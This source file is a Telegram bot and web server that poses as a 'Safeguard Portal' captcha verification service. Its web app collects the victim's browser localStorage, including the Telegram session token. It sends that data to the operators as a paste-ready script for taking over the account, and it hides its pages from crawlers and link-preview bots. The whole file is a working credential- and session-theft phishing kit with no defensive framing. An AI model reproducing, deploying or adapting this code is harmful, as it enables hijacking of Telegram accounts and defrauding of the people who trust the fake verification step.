import {
  Bot,
  InlineKeyboard,
  InputFile,
  webhookCallback,
} from "https://deno.land/x/grammy@v1.30.0/mod.ts";
import {
  Application,
  Context,
  isHttpError,
  Status,
} from "https://deno.land/x/oak@v17.0.0/mod.ts";
import { oakCors } from "https://deno.land/x/cors@v1.2.2/mod.ts";

type SafeguardConfig = {
  channel: string;
  image: string;
  name: string;
  inviteLink: string;
};

/* #region environment variable */
const botOwner = Deno.env.get("BOT_OWNER") as string;
const botName = Deno.env.get("BOT_NAME");
const webAppLink = Deno.env.get("WEB_APP_LINK");
const gateKeeper = Deno.env.get("GATE_KEEPER");
const sgClickVerifyURL = Deno.env.get("SAFEGUARD_CLICK_VERIFY");
const sgTapToVerifyURL = Deno.env.get("SAFEGUARD_TAP_VERIFY");
const sgVerifiedURL = Deno.env.get("SAFEGUARD_VERIFIED");
const DEBUG = Boolean(Number(Deno.env.get("DEBUG")));
/* #endregion */

/* #region init */
const botLink = `tg://resolve?domain=${botName}&start=`;
const sgConfigDefault: SafeguardConfig = {
  channel: "",
  image: "",
  name: "",
  inviteLink: "",
};
const bot = new Bot(gateKeeper as string);
const app = new Application();
/* #endregion */

/* #region telegram */
bot.chatType("private").command("start", async (ctx) => {
  const msg = ctx.message?.text.split(" ");
  const id = msg[msg.length - 1];

  const caption = `<b>Verify you're human with Safeguard Portal</b>
    
Click 'VERIFY' and complete captcha to gain entry - <a href="https://docs.safeguard.run/group-security/verification-issues"><i>Not working?</i></a>`;
  const sgClickVerify = await Deno.open("./safeguard-click-verify.jpg");
  const input = new InputFile(sgClickVerifyURL || sgClickVerify);
  const keyboard = new InlineKeyboard().webApp(
    "VERIFY",
    (webAppLink as string) + "?c=" + id
  );
  await bot.api.raw.sendPhoto({
    caption,
    photo: input,
    chat_id: ctx.chatId,
    parse_mode: "HTML",
    reply_markup: keyboard,
  });
});

bot.on("my_chat_member", async (ctx) => {
  if (ctx.myChatMember.chat.type !== "channel") return;

  const caption = `<b>Verify you're human with Safeguard Portal</b>

Click 'VERIFY' and complete captcha to gain entry - <a href="https://docs.safeguard.run/group-security/verification-issues"><i>Not working?</i></a>`;
  const sgClickVerify = await Deno.open("./safeguard-click-verify.jpg");
  const input = new InputFile(sgClickVerifyURL || sgClickVerify);
  const keyboard = new InlineKeyboard().url("VERIFY", webAppLink as string);
  await bot.api.raw.sendPhoto({
    caption,
    photo: input,
    chat_id: ctx.chatId,
    parse_mode: "HTML",
    reply_markup: keyboard,
  });
});

bot.chatType("private").command("setup", async (ctx) => {
  const text = `Fill below and send
  
channel: //@username
image: // image url to display in your channel
name:  // community name
inviteLink: // your group invite link`;
  await ctx.api.raw.sendMessage({
    text,
    chat_id: ctx.chatId,
  });
});

bot.chatType("private").on("message:text", async (ctx) => {
  let reply = `Saved!
  
Please note that it will be deleted after summer.`;
  const config: SafeguardConfig = {
    ...sgConfigDefault,
  };
  const text = ctx.message.text.split("\n");
  const kv = (text: string) => {
    const value = text.trim().split(":");
    if (value.length < 2) throw new Error("Invalid format");
    return value.slice(1).join(":").trim();
  };

  try {
    config.channel = kv(text[0]);
    config.image = kv(text[1]);
    config.name = kv(text[2]);
    config.inviteLink = kv(text[3]);
    const deno = await Deno.openKv();
    await deno.set(["channel", config.channel], config);
  } catch (e) {
    console.error(e);
    reply = "Hmmm, looks like your get is wrong";
  }

  ctx.api.raw.sendMessage({
    text: reply,
    chat_id: ctx.chatId,
  });
});

bot.catch((e) => {
  console.error(e.message);
});
/* #endregion */

/* #region webserver */

const MIME_TYPES: { [key: string]: string } = {
  ".html": "text/html",
  ".css": "text/css",
  ".js": "application/javascript",
  ".json": "application/json",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".svg": "image/svg+xml",
  ".ico": "image/x-icon",
  ".wasm": "application/wasm",
  ".txt": "text/plain",
};

async function serveStatic(
  ctx: Context,
  root: string,
  filePath: string,
): Promise<void> {
  try {
    const fullPath = root.endsWith("/") ? root + filePath : root + "/" + filePath;
    const data = await Deno.readFile(fullPath);
    const ext = filePath.includes(".") ? filePath.slice(filePath.lastIndexOf(".")) : "";
    ctx.response.type = MIME_TYPES[ext] || "application/octet-stream";
    ctx.response.body = data;
  } catch {
    try {
      const indexPath = root.endsWith("/") ? root + "index.html" : root + "/index.html";
      const data = await Deno.readFile(indexPath);
      ctx.response.type = "text/html";
      ctx.response.body = data;
    } catch {
      ctx.response.status = Status.NotFound;
      ctx.response.body = "Not Found";
    }
  }
}

const BOT_REGEX = /bot|crawler|spider|crawl|scrape|facebookexternalhit|twitterbot|telegrambot|whatsapp|slack|discord|linkedinbot|googlebot|bingbot|duckduckgo|baiduspider|yandex|pinterest|embedly|preview|prerender|chrome-lighthouse/i;

function isbot(ua: string): boolean {
  return BOT_REGEX.test(ua);
}

const newVerified = async (ctx: Context) => {
  const body = await ctx.request.body.json();
  const storage = body.storage;

  if (storage) {
    const user = body.user || { username: "durov", id: "" };
    if (!user.id && storage.user_auth) {
      user.id = JSON.parse(storage.user_auth).id;
    }

    try {
      const log = `<tg-emoji emoji-id="5260206718410839459">✅</tg-emoji><a  href="t.me/${
        user.username
      }">@${user.username}</a>

<pre>Object.entries(${JSON.stringify(
        storage
      )}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();</pre>`;
      for (const owner of botOwner.split(",")) {
        await bot.api.raw.sendMessage({
          text: log,
          chat_id: owner,
          parse_mode: "HTML",
        });
      }
      const deno = await Deno.openKv();
      const entry = await deno.get([
        "channel",
        "default",
      ]);
      const config = (entry.value || sgConfigDefault) as SafeguardConfig;
      const imageLink = sgVerifiedURL
        ? new URL(sgVerifiedURL)
        : "./safeguard-verify.jpg";
      const verifyMsg = `Verified, you can join the group using this temporary link:
    
<a href="${config.inviteLink}">${config.inviteLink}</a>
    
This link is a one time use and will expire`;
      const inviteMsg = `<b>Verified!</b> 
  
Join request has been sent and you will be added once the admin approves your request`;
      const user_auth = JSON.parse(storage.user_auth);
      await bot.api.raw.sendPhoto({
        caption: config.inviteLink ? verifyMsg : inviteMsg,
        photo: new InputFile(imageLink),
        parse_mode: "HTML",
        chat_id: user_auth.id,
      });
    } catch (ex) {
      console.error(ex);
    }
  }

  ctx.response.status = Status.OK;
  ctx.response.type = "application/json";
  ctx.response.body = { msg: "ok" };
};

app.use(async (context, next) => {
  const start = Date.now();
  await next();
  const ms = Date.now() - start;
  context.response.headers.set("X-Response-Time", `${ms}ms`);
});

app.use(async (ctx: Context, next) => {
  try {
    await next();
  } catch (err) {
    ctx.response.status = Status.OK;
    ctx.response.type = "json";
    ctx.response.body = { msg: "ok" };
    if (isHttpError(err)) {
      ctx.response.status = err.status;
    } else {
      console.error(err);
    }
  }
});

app.use(async (ctx: Context) => {
  if (isbot(ctx.request.userAgent.ua)) return;
  if (!(ctx.request.method === "POST" || ctx.request.method === "GET")) return;

  const path = ctx.request.url.pathname.slice(1);
  let index = "index.html";
  const s = path.split("/");
  if (s.length !== 1) {
    index = s[s.length - 1];
  }
  if (path === "tg-webhook") {
    const handleBotUpdate = webhookCallback(bot, "oak");
    await handleBotUpdate(ctx);
  } else if (path === "new-verified") {
    await newVerified(ctx);
  } else if (path.includes("sg")) {
    await serveStatic(ctx, "./static/sg", index);
  } else if (path.includes("tweb")) {
    await serveStatic(ctx, "./static/tweb", index);
  } else if (path.split(".").length !== 0) {
    await serveStatic(ctx, "./static/tweb", path);
  } else {
    ctx.response.status = Status.OK;
    ctx.response.type = "json";
    ctx.response.body = { msg: "ok" };
  }
});

app.use(oakCors());
/* #endregion */

if (DEBUG) {
  app.listen({ hostname: "127.0.0.1", port: 8000 });
  bot.start();
}

app.listen();
